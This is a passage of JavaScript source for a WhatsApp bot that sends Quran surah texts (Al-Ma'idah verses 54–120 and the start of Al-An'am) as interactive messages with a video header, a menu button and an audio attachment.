قُلْ يٰٓاَهْلَ الْكِتٰبِ لَا تَغْلُوْا فِيْ دِيْنِكُمْ غَيْرَ الْحَقِّ وَلَا تَتَّبِعُوْٓا اَهْوَاۤءَ قَوْمٍ قَدْ ضَلُّوْا مِنْ قَبْلُ وَاَضَلُّوْا كَثِيْرًا وَّضَلُّوْا عَنْ سَوَاۤءِ السَّبِيْلِ
لُعِنَ الَّذِيْنَ كَفَرُوْا مِنْۢ بَنِيْٓ اِسْرَاۤءِيْلَ عَلٰى لِسَانِ دَاوٗدَ وَعِيْسَى ابْنِ مَرْيَمَ ۗ ذٰلِكَ بِمَا عَصَوْا وَّكَانُوْا يَعْتَدُوْنَ
كَانُوْا لَا يَتَنَاهَوْنَ عَنْ مُّنْكَرٍ فَعَلُوْهُ ۗ لَبِئْسَ مَا كَانُوْا يَفْعَلُوْنَ
تَرٰى كَثِيْرًا مِّنْهُمْ يَتَوَلَّوْنَ الَّذِيْنَ كَفَرُوْا ۗ لَبِئْسَ مَا قَدَّمَتْ لَهُمْ اَنْفُسُهُمْ اَنْ سَخِطَ اللّٰهُ عَلَيْهِمْ وَفِى الْعَذَابِ هُمْ خٰلِدُوْنَ
وَلَوْ كَانُوْا يُؤْمِنُوْنَ بِاللّٰهِ وَالنَّبِيِّ وَمَآ اُنْزِلَ اِلَيْهِ مَا اتَّخَذُوْهُمْ اَوْلِيَاۤءَ وَلٰكِنَّ كَثِيْرًا مِّنْهُمْ فٰسِقُوْنَ
لَتَجِدَنَّ اَشَدَّ النَّاسِ عَدَاوَةً لِّلَّذِيْنَ اٰمَنُوا الْيَهُوْدَ وَالَّذِيْنَ اَشْرَكُوْا ۚ وَلَتَجِدَنَّ اَقْرَبَهُمْ مَّوَدَّةً لِّلَّذِيْنَ اٰمَنُوا الَّذِيْنَ قَالُوْٓا اِنَّا نَصٰرٰى ۗ ذٰلِكَ بِاَنَّ مِنْهُمْ قِسِّيْسِيْنَ وَرُهْبَانًا وَّاَنَّهُمْ لَا يَسْتَكْبِرُوْنَ
وَاِذَا سَمِعُوْا مَآ اُنْزِلَ اِلَى الرَّسُوْلِ تَرٰىٓ اَعْيُنَهُمْ تَفِيْضُ مِنَ الدَّمْعِ مِمَّا عَرَفُوْا مِنَ الْحَقِّ ۚ يَقُوْلُوْنَ رَبَّنَآ اٰمَنَّا فَاكْتُبْنَا مَعَ الشّٰهِدِيْنَ
وَمَا لَنَا لَا نُؤْمِنُ بِاللّٰهِ وَمَا جَاۤءَنَا مِنَ الْحَقِّ ۙ وَنَطْمَعُ اَنْ يُّدْخِلَنَا رَبُّنَا مَعَ الْقَوْمِ الصّٰلِحِيْنَ
فَاَثَابَهُمُ اللّٰهُ بِمَا قَالُوْا جَنّٰتٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا ۗ وَذٰلِكَ جَزَاۤءُ الْمُحْسِنِيْنَ
وَالَّذِيْنَ كَفَرُوْا وَكَذَّبُوْا بِاٰيٰتِنَآ اُولٰۤىِٕكَ اَصْحٰبُ الْجَحِيْمِ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تُحَرِّمُوْا طَيِّبٰتِ مَآ اَحَلَّ اللّٰهُ لَكُمْ وَلَا تَعْتَدُوْا ۗ اِنَّ اللّٰهَ لَا يُحِبُّ الْمُعْتَدِيْنَ
وَكُلُوْا مِمَّا رَزَقَكُمُ اللّٰهُ حَلٰلًا طَيِّبًا ۖ وَّاتَّقُوا اللّٰهَ الَّذِيْٓ اَنْتُمْ بِهٖ مُؤْمِنُوْنَ
لَا يُؤَاخِذُكُمُ اللّٰهُ بِاللَّغْوِ فِيْٓ اَيْمَانِكُمْ وَلٰكِنْ يُّؤَاخِذُكُمْ بِمَا عَقَّدْتُّمُ الْاَيْمَانَ ۚ فَكَفَّارَتُهٗٓ اِطْعَامُ عَشَرَةِ مَسٰكِيْنَ مِنْ اَوْسَطِ مَا تُطْعِمُوْنَ اَهْلِيْكُمْ اَوْ كِسْوَتُهُمْ اَوْ تَحْرِيْرُ رَقَبَةٍ ۗ فَمَنْ لَّمْ يَجِدْ فَصِيَامُ ثَلٰثَةِ اَيَّامٍ ۗ ذٰلِكَ كَفَّارَةُ اَيْمَانِكُمْ اِذَا حَلَفْتُمْ ۗ وَاحْفَظُوْٓا اَيْمَانَكُمْ ۗ كَذٰلِكَ يُبَيِّنُ اللّٰهُ لَكُمْ اٰيٰتِهٖ لَعَلَّكُمْ تَشْكُرُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِنَّمَا الْخَمْرُ وَالْمَيْسِرُ وَالْاَنْصَابُ وَالْاَزْلَامُ رِجْسٌ مِّنْ عَمَلِ الشَّيْطٰنِ فَاجْتَنِبُوْهُ لَعَلَّكُمْ تُفْلِحُوْنَ
اِنَّمَا يُرِيْدُ الشَّيْطٰنُ اَنْ يُّوْقِعَ بَيْنَكُمُ الْعَدَاوَةَ وَالْبَغْضَاۤءَ فِى الْخَمْرِ وَالْمَيْسِرِ وَيَصُدَّكُمْ عَنْ ذِكْرِ اللّٰهِ وَعَنِ الصَّلٰوةِ ۚ فَهَلْ اَنْتُمْ مُّنْتَهُوْنَ
وَاَطِيْعُوا اللّٰهَ وَاَطِيْعُوا الرَّسُوْلَ وَاحْذَرُوْا ۚ فَاِنْ تَوَلَّيْتُمْ فَاعْلَمُوْٓا اَنَّمَا عَلٰى رَسُوْلِنَا الْبَلٰغُ الْمُبِيْنُ
لَيْسَ عَلَى الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ جُنَاحٌ فِيْمَا طَعِمُوْٓا اِذَا مَا اتَّقَوْا وَّاٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ ثُمَّ اتَّقَوْا وَّاٰمَنُوْا ثُمَّ اتَّقَوْا وَّاَحْسَنُوْا ۗ وَاللّٰهُ يُحِبُّ الْمُحْسِنِيْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَيَبْلُوَنَّكُمُ اللّٰهُ بِشَيْءٍ مِّنَ الصَّيْدِ تَنَالُهٗٓ اَيْدِيْكُمْ وَرِمَاحُكُمْ لِيَعْلَمَ اللّٰهُ مَنْ يَّخَافُهٗ بِالْغَيْبِ ۚ فَمَنِ اعْتَدٰى بَعْدَ ذٰلِكَ فَلَهٗ عَذَابٌ اَلِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَقْتُلُوا الصَّيْدَ وَاَنْتُمْ حُرُمٌ ۗ وَمَنْ قَتَلَهٗ مِنْكُمْ مُّتَعَمِّدًا فَجَزَاۤءٌ مِّثْلُ مَا قَتَلَ مِنَ النَّعَمِ يَحْكُمُ بِهٖ ذَوَا عَدْلٍ مِّنْكُمْ هَدْيًاۢ بٰلِغَ الْكَعْبَةِ اَوْ كَفَّارَةٌ طَعَامُ مَسٰكِيْنَ اَوْ عَدْلُ ذٰلِكَ صِيَامًا لِّيَذُوْقَ وَبَالَ اَمْرِهٖ ۗ عَفَا اللّٰهُ عَمَّا سَلَفَ ۗ وَمَنْ عَادَ فَيَنْتَقِمُ اللّٰهُ مِنْهُ ۗ وَاللّٰهُ عَزِيْزٌ ذُو انْتِقَامٍ
اُحِلَّ لَكُمْ صَيْدُ الْبَحْرِ وَطَعَامُهٗ مَتَاعًا لَّكُمْ وَلِلسَّيَّارَةِ ۚ وَحُرِّمَ عَلَيْكُمْ صَيْدُ الْبَرِّ مَا دُمْتُمْ حُرُمًا ۗ وَاتَّقُوا اللّٰهَ الَّذِيْٓ اِلَيْهِ تُحْشَرُوْنَ
جَعَلَ اللّٰهُ الْكَعْبَةَ الْبَيْتَ الْحَرَامَ قِيٰمًا لِّلنَّاسِ وَالشَّهْرَ الْحَرَامَ وَالْهَدْيَ وَالْقَلَاۤىِٕدَ ۗ ذٰلِكَ لِتَعْلَمُوْٓا اَنَّ اللّٰهَ يَعْلَمُ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ وَاَنَّ اللّٰهَ بِكُلِّ شَيْءٍ عَلِيْمٌ
اِعْلَمُوْٓا اَنَّ اللّٰهَ شَدِيْدُ الْعِقَابِ وَاَنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
مَا عَلَى الرَّسُوْلِ اِلَّا الْبَلٰغُ ۗ وَاللّٰهُ يَعْلَمُ مَا تُبْدُوْنَ وَمَا تَكْتُمُوْنَ
قُلْ لَّا يَسْتَوِى الْخَبِيْثُ وَالطَّيِّبُ وَلَوْ اَعْجَبَكَ كَثْرَةُ الْخَبِيْثِ ۚ فَاتَّقُوا اللّٰهَ يٰٓاُولِى الْاَلْبَابِ لَعَلَّكُمْ تُفْلِحُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَسْـَٔلُوْا عَنْ اَشْيَاۤءَ اِنْ تُبْدَ لَكُمْ تَسُؤْكُمْ ۚ وَاِنْ تَسْـَٔلُوْا عَنْهَا حِيْنَ يُنَزَّلُ الْقُرْاٰنُ تُبْدَ لَكُمْ ۗ عَفَا اللّٰهُ عَنْهَا ۗ وَاللّٰهُ غَفُوْرٌ حَلِيْمٌ
قَدْ سَاَلَهَا قَوْمٌ مِّنْ قَبْلِكُمْ ثُمَّ اَصْبَحُوْا بِهَا كٰفِرِيْنَ
مَا جَعَلَ اللّٰهُ مِنْۢ بَحِيْرَةٍ وَّلَا سَاۤىِٕبَةٍ وَّلَا وَصِيْلَةٍ وَّلَا حَامٍ ۙ وَلٰكِنَّ الَّذِيْنَ كَفَرُوْا يَفْتَرُوْنَ عَلَى اللّٰهِ الْكَذِبَ ۗ وَاَكْثَرُهُمْ لَا يَعْقِلُوْنَ
وَاِذَا قِيْلَ لَهُمْ تَعَالَوْا اِلٰى مَآ اَنْزَلَ اللّٰهُ وَاِلَى الرَّسُوْلِ قَالُوْا حَسْبُنَا مَا وَجَدْنَا عَلَيْهِ اٰبَاۤءَنَا ۗ اَوَلَوْ كَانَ اٰبَاۤؤُهُمْ لَا يَعْلَمُوْنَ شَيْـًٔا وَّلَا يَهْتَدُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا عَلَيْكُمْ اَنْفُسَكُمْ ۚ لَا يَضُرُّكُمْ مَّنْ ضَلَّ اِذَا اهْتَدَيْتُمْ ۗ اِلَى اللّٰهِ مَرْجِعُكُمْ جَمِيْعًا فَيُنَبِّئُكُمْ بِمَا كُنْتُمْ تَعْمَلُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا شَهَادَةُ بَيْنِكُمْ اِذَا حَضَرَ اَحَدَكُمُ الْمَوْتُ حِيْنَ الْوَصِيَّةِ اثْنٰنِ ذَوَا عَدْلٍ مِّنْكُمْ اَوْ اٰخَرٰنِ مِنْ غَيْرِكُمْ اِنْ اَنْتُمْ ضَرَبْتُمْ فِى الْاَرْضِ فَاَصَابَتْكُمْ مُّصِيْبَةُ الْمَوْتِ ۗ تَحْبِسُوْنَهُمَا مِنْۢ بَعْدِ الصَّلٰوةِ فَيُقْسِمٰنِ بِاللّٰهِ اِنِ ارْتَبْتُمْ لَا نَشْتَرِيْ بِهٖ ثَمَنًا وَّلَوْ كَانَ ذَا قُرْبٰى ۙ وَلَا نَكْتُمُ شَهَادَةَ اللّٰهِ ۙ اِنَّآ اِذًا لَّمِنَ الْاٰثِمِيْنَ
فَاِنْ عُثِرَ عَلٰٓى اَنَّهُمَا اسْتَحَقَّآ اِثْمًا فَاٰخَرٰنِ يَقُوْمٰنِ مَقَامَهُمَا مِنَ الَّذِيْنَ اسْتَحَقَّ عَلَيْهِمُ الْاَوْلَيٰنِ فَيُقْسِمٰنِ بِاللّٰهِ لَشَهَادَتُنَآ اَحَقُّ مِنْ شَهَادَتِهِمَا وَمَا اعْتَدَيْنَا ۖ اِنَّآ اِذًا لَّمِنَ الظّٰلِمِيْنَ
ذٰلِكَ اَدْنٰٓى اَنْ يَّأْتُوْا بِالشَّهَادَةِ عَلٰى وَجْهِهَآ اَوْ يَخَافُوْٓا اَنْ تُرَدَّ اَيْمَانٌۢ بَعْدَ اَيْمَانِهِمْ ۗ وَاتَّقُوا اللّٰهَ وَاسْمَعُوْا ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الْفٰسِقِيْنَ
يَوْمَ يَجْمَعُ اللّٰهُ الرُّسُلَ فَيَقُوْلُ مَاذَآ اُجِبْتُمْ ۗ قَالُوْا لَا عِلْمَ لَنَا ۗ اِنَّكَ اَنْتَ عَلَّامُ الْغُيُوْبِ
اِذْ قَالَ اللّٰهُ يٰعِيْسَى ابْنَ مَرْيَمَ اذْكُرْ نِعْمَتِيْ عَلَيْكَ وَعَلٰى وَالِدَتِكَ ۘ اِذْ اَيَّدْتُّكَ بِرُوْحِ الْقُدُسِ تُكَلِّمُ النَّاسَ فِى الْمَهْدِ وَكَهْلًا ۚ وَاِذْ عَلَّمْتُكَ الْكِتٰبَ وَالْحِكْمَةَ وَالتَّوْرٰىةَ وَالْاِنْجِيْلَ ۚ وَاِذْ تَخْلُقُ مِنَ الطِّيْنِ كَهَيْـَٔةِ الطَّيْرِ بِاِذْنِيْ فَتَنْفُخُ فِيْهَا فَتَكُوْنُ طَيْرًاۢ بِاِذْنِيْ وَتُبْرِئُ الْاَكْمَهَ وَالْاَبْرَصَ بِاِذْنِيْ ۚ وَاِذْ تُخْرِجُ الْمَوْتٰى بِاِذْنِيْ ۚ وَاِذْ كَفْتُ بَنِيْٓ اِسْرَاۤءِيْلَ عَنْكَ اِذْ جِئْتَهُمْ بِالْبَيِّنٰتِ فَقَالَ الَّذِيْنَ كَفَرُوْا مِنْهُمْ اِنْ هٰذَآ اِلَّا سِحْرٌ مُّبِيْنٌ
وَاِذْ اَوْحَيْتُ اِلَى الْحَوَارِيّٖنَ اَنْ اٰمِنُوْا بِيْ وَبِرَسُوْلِيْ ۚ قَالُوْٓا اٰمَنَّا وَاشْهَدْ بِاَنَّنَا مُسْلِمُوْنَ
اِذْ قَالَ الْحَوَارِيُّوْنَ يٰعِيْسَى ابْنَ مَرْيَمَ هَلْ يَسْتَطِيْعُ رَبُّكَ اَنْ يُّنَزِّلَ عَلَيْنَا مَاۤىِٕدَةً مِّنَ السَّمَاۤءِ ۗ قَالَ اتَّقُوا اللّٰهَ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
قَالُوْا نُرِيْدُ اَنْ نَّأْكُلَ مِنْهَا وَتَطْمَىِٕنَّ قُلُوْبُنَا وَنَعْلَمَ اَنْ قَدْ صَدَقْتَنَا وَنَكُوْنَ عَلَيْهَا مِنَ الشّٰهِدِيْنَ
قَالَ عِيْسَى ابْنُ مَرْيَمَ اللّٰهُمَّ رَبَّنَآ اَنْزِلْ عَلَيْنَا مَاۤىِٕدَةً مِّنَ السَّمَاۤءِ تَكُوْنُ لَنَا عِيْدًا لِّاَوَّلِنَا وَاٰخِرِنَا وَاٰيَةً مِّنْكَ ۚ وَارْزُقْنَا وَاَنْتَ خَيْرُ الرّٰزِقِيْنَ
قَالَ اللّٰهُ اِنِّيْ مُنَزِّلُهَا عَلَيْكُمْ ۚ فَمَنْ يَّكْفُرْ بَعْدُ مِنْكُمْ فَاِنِّيْٓ اُعَذِّبُهٗ عَذَابًا لَّآ اُعَذِّبُهٗٓ اَحَدًا مِّنَ الْعٰلَمِيْنَ
وَاِذْ قَالَ اللّٰهُ يٰعِيْسَى ابْنَ مَرْيَمَ ءَاَنْتَ قُلْتَ لِلنَّاسِ اتَّخِذُوْنِيْ وَاُمِّيَ اِلٰهَيْنِ مِنْ دُوْنِ اللّٰهِ ۗ قَالَ سُبْحٰنَكَ مَا يَكُوْنُ لِيْٓ اَنْ اَقُوْلَ مَا لَيْسَ لِيْ بِحَقٍّ ۗ اِنْ كُنْتُ قُلْتُهٗ فَقَدْ عَلِمْتَهٗ ۗ تَعْلَمُ مَا فِيْ نَفْسِيْ وَلَآ اَعْلَمُ مَا فِيْ نَفْسِكَ ۗ اِنَّكَ اَنْتَ عَلَّامُ الْغُيُوْبِ
مَا قُلْتُ لَهُمْ اِلَّا مَآ اَمَرْتَنِيْ بِهٖٓ اَنِ اعْبُدُوا اللّٰهَ رَبِّيْ وَرَبَّكُمْ ۚ وَكُنْتُ عَلَيْهِمْ شَهِيْدًا مَّا دُمْتُ فِيْهِمْ ۚ فَلَمَّا تَوَفَّيْتَنِيْ كُنْتَ اَنْتَ الرَّقِيْبَ عَلَيْهِمْ ۗ وَاَنْتَ عَلٰى كُلِّ شَيْءٍ شَهِيْدٌ
اِنْ تُعَذِّبْهُمْ فَاِنَّهُمْ عِبَادُكَ ۚ وَاِنْ تَغْفِرْ لَهُمْ فَاِنَّكَ اَنْتَ الْعَزِيْزُ الْحَكِيْمُ
قَالَ اللّٰهُ هٰذَا يَوْمُ يَنْفَعُ الصّٰدِقِيْنَ صِدْقُهُمْ ۗ لَهُمْ جَنّٰتٌ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَآ اَبَدًا ۗ رَضِيَ اللّٰهُ عَنْهُمْ وَرَضُوْا عَنْهُ ۗ ذٰلِكَ الْفَوْزُ الْعَظِيْمُ
لِلّٰهِ مُلْكُ السَّمٰوٰتِ وَالْاَرْضِ وَمَا فِيْهِنَّ ۗ وَهُوَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐋-𝐌𝐀'𝐈𝐃𝐀𝐇",
 url: `https://quran.com/5`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© AL-MA'IDAH"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AL-MA'IDAH",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 54-120", id: `${prefix}al-maidah` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'al-anam':
case 'alanam':
case 'anam': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗔𝗡'𝗔𝗠\`
Surat ke-6 | 165 ayat | Makkiyah | Hewan Ternak

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁 𝐋𝐄𝐍𝐆𝐊𝐀𝐏\`
بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
اَلْحَمْدُ لِلّٰهِ الَّذِيْ خَلَقَ السَّمٰوٰتِ وَالْاَرْضَ وَجَعَلَ الظُّلُمٰتِ وَالنُّوْرَ ەۗ ثُمَّ الَّذِيْنَ كَفَرُوْا بِرَبِّهِمْ يَعْدِلُوْنَ
هُوَ الَّذِيْ خَلَقَكُمْ مِّنْ طِيْنٍ ثُمَّ قَضٰىٓ اَجَلًا ۗ وَاَجَلٌ مُّسَمًّى عِنْدَهٗ ثُمَّ اَنْتُمْ تَمْتَرُوْنَ
وَهُوَ اللّٰهُ فِى السَّمٰوٰتِ وَفِى الْاَرْضِ ۗ يَعْلَمُ سِرَّكُمْ وَجَهْرَكُمْ وَيَعْلَمُ مَا تَكْسِبُوْنَ
وَمَا تَأْتِيْهِمْ مِّنْ اٰيَةٍ مِّنْ اٰيٰتِ رَبِّهِمْ اِلَّا كَانُوْا عَنْهَا مُعْرِضِيْنَ
فَقَدْ كَذَّبُوْا بِالْحَقِّ لَمَّا جَاۤءَهُمْ فَسَوْفَ يَأْتِيْهِمْ اَنْۢبٰۤؤُا مَا كَانُوْا بِهٖ يَسْتَهْزِءُوْنَ
اَلَمْ يَرَوْا كَمْ اَهْلَكْنَا مِنْ قَبْلِهِمْ مِّنْ قَرْنٍ مَّكَّنّٰهُمْ فِى الْاَرْضِ مَا لَمْ نُمَكِّنْ لَّكُمْ وَاَرْسَلْنَا السَّمَاۤءَ عَلَيْهِمْ مِّدْرَارًاۖ وَّجَعَلْنَا الْاَنْهٰرَ تَجْرِيْ مِنْ تَحْتِهِمْ فَاَهْلَكْنٰهُمْ بِذُنُوْبِهِمْ وَاَنْشَأْنَا مِنْۢ بَعْدِهِمْ قَرْنًا اٰخَرِيْنَ
وَلَوْ نَزَّلْنَا عَلَيْكَ كِتٰبًا فِيْ قِرْطَاسٍ فَلَمَسُوْهُ بِاَيْدِيْهِمْ لَقَالَ الَّذِيْنَ كَفَرُوْٓا اِنْ هٰذَآ اِلَّا سِحْرٌ مُّبِيْنٌ
وَقَالُوْا لَوْلَآ اُنْزِلَ عَلَيْهِ مَلَكٌ ۗ وَلَوْ اَنْزَلْنَا مَلَكًا لَّقُضِيَ الْاَمْرُ ثُمَّ لَا يُنْظَرُوْنَ
وَلَوْ جَعَلْنٰهُ مَلَكًا لَّجَعَلْنٰهُ رَجُلًا وَّلَلَبَسْنَا عَلَيْهِمْ مَّا يَلْبِسُوْنَ
وَلَقَدِ اسْتُهْزِئَ بِرُسُلٍ مِّنْ قَبْلِكَ فَحَاقَ بِالَّذِيْنَ سَخِرُوْا مِنْهُمْ مَّا كَانُوْا بِهٖ يَسْتَهْزِءُوْنَ
قُلْ سِيْرُوْا فِى الْاَرْضِ ثُمَّ انْظُرُوْا كَيْفَ كَانَ عَاقِبَةُ الْمُكَذِّبِيْنَ
قُلْ لِّمَنْ مَّا فِى السَّمٰوٰتِ وَالْاَرْضِ ۗ قُلْ لِّلّٰهِ ۗ كَتَبَ عَلٰى نَفْسِهِ الرَّحْمَةَ ۗ لَيَجْمَعَنَّكُمْ اِلٰى يَوْمِ الْقِيٰمَةِ لَا رَيْبَ فِيْهِ ۗ اَلَّذِيْنَ خَسِرُوْٓا اَنْفُسَهُمْ فَهُمْ لَا يُؤْمِنُوْنَ
وَلَهٗ مَا سَكَنَ فِى الَّيْلِ وَالنَّهَارِ ۗ وَهُوَ السَّمِيْعُ الْعَلِيْمُ
قُلْ اَغَيْرَ اللّٰهِ اَتَّخِذُ وَلِيًّا فَاطِرِ السَّمٰوٰتِ وَالْاَرْضِ وَهُوَ يُطْعِمُ وَلَا يُطْعَمُ ۗ قُلْ اِنِّيْٓ اُمِرْتُ اَنْ اَكُوْنَ اَوَّلَ مَنْ اَسْلَمَ وَلَا تَكُوْنَنَّ مِنَ الْمُشْرِكِيْنَ
قُلْ اِنِّيْٓ اَخَافُ اِنْ عَصَيْتُ رَبِّيْ عَذَابَ يَوْمٍ عَظِيْمٍ
مَنْ يُّصْرَفْ عَنْهُ يَوْمَىِٕذٍ فَقَدْ رَحِمَهٗ ۗ وَذٰلِكَ الْفَوْزُ الْمُبِيْنُ
وَاِنْ يَّمْسَسْكَ اللّٰهُ بِضُرٍّ فَلَا كَاشِفَ لَهٗٓ اِلَّا هُوَ ۗ وَاِنْ يَّمْسَسْكَ بِخَيْرٍ فَهُوَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
وَهُوَ الْقَاهِرُ فَوْقَ عِبَادِهٖ ۗ وَهُوَ الْحَكِيْمُ الْخَبِيْرُ
قُلْ اَيُّ شَيْءٍ اَكْبَرُ شَهَادَةً ۗ قُلِ اللّٰهُ ۗ شَهِيْدٌۢ بَيْنِيْ وَبَيْنَكُمْ ۚ وَاُوْحِيَ اِلَيَّ هٰذَا الْقُرْاٰنُ لِاُنْذِرَكُمْ بِهٖ وَمَنْۢ بَلَغَ ۗ اَىِٕنَّكُمْ لَتَشْهَدُوْنَ اَنَّ مَعَ اللّٰهِ اٰلِهَةً اُخْرٰى ۗ قُلْ لَّآ اَشْهَدُ ۚ قُلْ اِنَّمَا هُوَ اِلٰهٌ وَّاحِدٌ وَّاِنَّنِيْ بَرِيْۤءٌ مِّمَّا تُشْرِكُوْنَ
اَلَّذِيْنَ اٰتَيْنٰهُمُ الْكِتٰبَ يَعْرِفُوْنَهٗ كَمَا يَعْرِفُوْنَ اَبْنَاۤءَهُمُ ۘ اَلَّذِيْنَ خَسِرُوْٓا اَنْفُسَهُمْ فَهُمْ لَا يُؤْمِنُوْنَ
وَمَنْ اَظْلَمُ مِمَّنِ افْتَرٰى عَلَى اللّٰهِ كَذِبًا اَوْ كَذَّبَ بِاٰيٰتِهٖ ۗ اِنَّهٗ لَا يُفْلِحُ الظّٰلِمُوْنَ
وَيَوْمَ نَحْشُرُهُمْ جَمِيْعًا ثُمَّ نَقُوْلُ لِلَّذِيْنَ اَشْرَكُوْٓا اَيْنَ شُرَكَاۤؤُكُمُ الَّذِيْنَ كُنْتُمْ تَزْعُمُوْنَ
ثُمَّ لَمْ تَكُنْ فِتْنَتُهُمْ اِلَّآ اَنْ قَالُوْا وَاللّٰهِ رَبِّنَا مَا كُنَّا مُشْرِكِيْنَ
اُنْظُرْ كَيْفَ كَذَبُوْا عَلٰٓى اَنْفُسِهِمْ وَضَلَّ عَنْهُمْ مَّا كَانُوْا يَفْتَرُوْنَ
وَمِنْهُمْ مَّنْ يَّسْتَمِعُ اِلَيْكَ ۚ وَجَعَلْنَا عَلٰى قُلُوْبِهِمْ اَكِنَّةً اَنْ يَّفْقَهُوْهُ وَفِيْٓ اٰذَانِهِمْ وَقْرًا ۗ وَاِنْ يَّرَوْا كُلَّ اٰيَةٍ لَّا يُؤْمِنُوْا بِهَا ۚ حَتّٰىٓ اِذَا جَاۤءُوْكَ يُجَادِلُوْنَكَ يَقُوْلُ الَّذِيْنَ كَفَرُوْٓا اِنْ هٰذَآ اِلَّآ اَسَاطِيْرُ الْاَوَّلِيْنَ
وَهُمْ يَنْهَوْنَ عَنْهُ وَيَنْـَٔوْنَ عَنْهُ ۚ وَاِنْ يُّهْلِكُوْنَ اِلَّآ اَنْفُسَهُمْ وَمَا يَشْعُرُوْنَ
وَلَوْ تَرٰىٓ اِذْ وُقِفُوْا عَلَى النَّارِ فَقَالُوْا يٰلَيْتَنَا نُرَدُّ وَلَا نُكَذِّبَ بِاٰيٰتِ رَبِّنَا وَنَكُوْنَ مِنَ الْمُؤْمِنِيْنَ
بَلْ بَدَا لَهُمْ مَّا كَانُوْا يُخْفُوْنَ مِنْ قَبْلُ ۗ وَلَوْ رُدُّوْا لَعَادُوْا لِمَا نُهُوْا عَنْهُ وَاِنَّهُمْ لَكٰذِبُوْنَ
وَقَالُوْٓا اِنْ هِيَ اِلَّا حَيَاتُنَا الدُّنْيَا وَمَا نَحْنُ بِمَبْعُوْثِيْنَ
وَلَوْ تَرٰىٓ اِذْ وُقِفُوْا عَلٰى رَبِّهِمْ ۗ قَالَ اَلَيْسَ هٰذَا بِالْحَقِّ ۗ قَالُوْا بَلٰى وَرَبِّنَا ۗ قَالَ فَذُوْقُوا الْعَذَابَ بِمَا كُنْتُمْ تَكْفُرُوْنَ
قَدْ خَسِرَ الَّذِيْنَ كَذَّبُوْا بِلِقَاۤءِ اللّٰهِ ۗ حَتّٰىٓ اِذَا جَاۤءَتْهُمُ السَّاعَةُ بَغْتَةً قَالُوْا يٰحَسْرَتَنَا عَلٰى مَا فَرَّطْنَا فِيْهَا ۙ وَهُمْ يَحْمِلُوْنَ اَوْزَارَهُمْ عَلٰى ظُهُوْرِهِمْ ۗ اَلَا سَاۤءَ مَا يَزِرُوْنَ
وَمَا الْحَيٰوةُ الدُّنْيَآ اِلَّا لَعِبٌ وَّلَهْوٌ ۗ وَلَلدَّارُ الْاٰخِرَةُ خَيْرٌ لِّلَّذِيْنَ يَتَّقُوْنَ ۗ اَفَلَا تَعْقِلُوْنَ
قَدْ نَعْلَمُ اِنَّهٗ لَيَحْزُنُكَ الَّذِيْ يَقُوْلُوْنَ فَاِنَّهُمْ لَا يُكَذِّبُوْنَكَ وَلٰكِنَّ الظّٰلِمِيْنَ بِاٰيٰتِ اللّٰهِ يَجْحَدُوْنَ
